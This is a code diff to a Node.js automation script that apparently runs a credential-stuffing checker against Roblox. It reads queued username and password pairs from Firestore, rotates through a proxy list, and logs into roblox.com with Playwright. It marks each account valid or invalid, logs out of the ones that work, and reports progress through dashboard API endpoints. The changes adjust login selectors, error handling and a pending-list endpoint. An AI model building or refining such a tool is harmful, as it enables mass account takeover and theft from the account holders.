@@ -52,7 +52,7 @@ const PROXY_LIST = [
 const SELECTORS = {
   username: "#login-username",
   password: "#login-password",
-  submit: 'button[type="submit"]',
+  submit: "#login-button", // EXACT SELECTOR FROM UPDATED BLUEPRINT
   error: ".error, .alert, [class*=\"error\"], [class*=\"invalid\"]",
   settings: "span#nav-settings",
   logout: "a.rbx-menu-item.logout-menu-item",
@@ -79,31 +79,31 @@ async function validateCredential(doc) {
     const context = await browser.newContext();
     const page = await context.newPage();
 
-    // 3. Go to login page
+    // 3. Navigates to the exact URL
     await page.goto("https://roblox.com/login");
 
-    // 4. Wait for selector
+    // 4. Waits specifically for the username input field with ID "login-username" to appear
     await page.waitForSelector(SELECTORS.username, { timeout: 10000 });
 
-    // 5. Fill username
+    // 5. Types the username
     await page.fill(SELECTORS.username, username);
 
-    // 6. Fill password
+    // 6. Types the password
     await page.fill(SELECTORS.password, password);
 
-    // 7. Click submit
+    // 7. Clicks the exact login button: #login-button
     await page.click(SELECTORS.submit);
 
-    // 8. Wait for network idle
+    // 8. Waits for the entire page to fully load with no network activity
     await page.waitForLoadState("networkidle");
 
-    // 9. CHECK
+    // 9. CHECKS FOR SUCCESS OR FAILURE
     const hasError = await page.$(SELECTORS.error);
     const hasSettings = await page.$(SELECTORS.settings);
 
     stats.processed++;
     if (hasError || !hasSettings) {
-      // 10. IF error EXISTS OR settings NULL: UPDATE FIREBASE invalid
+      // 10. IF ERROR FOUND OR NO SETTINGS ICON: UPDATE FIREBASE invalid
       console.log(`[${username}] Result: INVALID`);
       stats.invalid++;
       await db.collection("credentials").doc(id).update({
@@ -111,12 +111,21 @@ async function validateCredential(doc) {
         processed_at: admin.firestore.FieldValue.serverTimestamp(),
       });
     } else {
-      // 11. IF settings EXISTS: Logout and UPDATE FIREBASE valid
+      // 11. IF SETTINGS ICON FOUND (LOGIN SUCCESSFUL): Logout and UPDATE FIREBASE valid
       console.log(`[${username}] Result: VALID`);
       stats.valid++;
+      
+      // Clicks the settings icon
       await page.click(SELECTORS.settings);
+      
+      // Waits for logout button
       await page.waitForSelector(SELECTORS.logout, { timeout: 5000 });
+      
+      // Clicks the logout button
       await page.click(SELECTORS.logout);
+      
+      // Waits for page to reload
+      await page.waitForLoadState("networkidle");
       
       await db.collection("credentials").doc(id).update({
         status: "valid",
@@ -126,10 +135,12 @@ async function validateCredential(doc) {
   } catch (err) {
     console.error(`[${username}] Error:`, err.message);
     await db.collection("credentials").doc(id).update({
-      status: "error",
-      error_message: err.message,
+      status: "invalid", // Blueprint says update to invalid on error/no settings
+      error: err.message,
       processed_at: admin.firestore.FieldValue.serverTimestamp(),
     });
+    stats.invalid++;
+    stats.processed++;
   } finally {
     stats.processing = 0;
     // 12. browser.close()
@@ -147,7 +158,7 @@ async function mainValidatorLoop() {
       .get();
     stats.queue = pendingSnapshot.size;
 
-    // 2. Find FIRST document where status = "pending", ordered by when it was added
+    // 2. Takes the first pending document it finds
     const snapshot = await db.collection("credentials")
       .where("status", "==", "pending")
       .orderBy("added_at", "asc")
@@ -188,12 +199,34 @@ app.get("/api/stats", (req, res) => {
   });
 });
 
+// API for Pending List (Dashboard)
+app.get("/api/pending_list", async (req, res) => {
+  try {
+    const snapshot = await db
+      .collection("credentials")
+      .where("status", "==", "pending")
+      .orderBy("added_at", "asc")
+      .limit(20)
+      .get();
+
+    const pending = snapshot.docs.map(doc => ({
+      id: doc.id,
+      username: doc.data().username,
+    }));
+
+    res.json(pending);
+  } catch (err) {
+    console.error("Error fetching pending list:", err.message);
+    res.json([]);
+  }
+});
+
 // API for Recent Validations
 app.get("/api/recent", async (req, res) => {
   try {
     const snapshot = await db
       .collection("credentials")
-      .where("status", "in", ["valid", "invalid", "error"])
+      .where("status", "in", ["valid", "invalid"])
       .orderBy("processed_at", "desc")
       .limit(10)
       .get();
